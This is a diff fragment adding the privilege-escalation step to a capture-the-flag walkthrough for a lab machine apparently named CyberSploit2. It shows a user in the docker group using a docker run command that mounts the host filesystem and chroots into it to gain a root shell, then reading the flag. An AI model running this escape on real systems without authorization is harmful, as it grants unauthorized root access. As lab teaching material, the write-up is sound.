@@ -69,8 +69,29 @@ uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker) co
 
 ### 4.Privilege Escalation
 
+Check group memebership and you see that user `shailendra` is member of docker group, so there is a PE path to get root on they system
 
+use the below command, make sure the vm has access to internet :
 
+```bash
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
 
+after that you can go to `/mnt` and find the flag in `/root` :
+
+```bash
+mnt/root # cat flag.txt 
+ __    ___   _      __    ___    __   _____  __  
+/ /`  / / \ | |\ | / /`_ | |_)  / /\   | |  ( (` 
+\_\_, \_\_/ |_| \| \_\_/ |_| \ /_/--\  |_|  _)_) 
+
+ Pwned CyberSploit2 POC
+
+share it with me twitter@cybersploit1
+
+              Thanks !
+```
+
+this is how you can get root on the machine :)
 
 
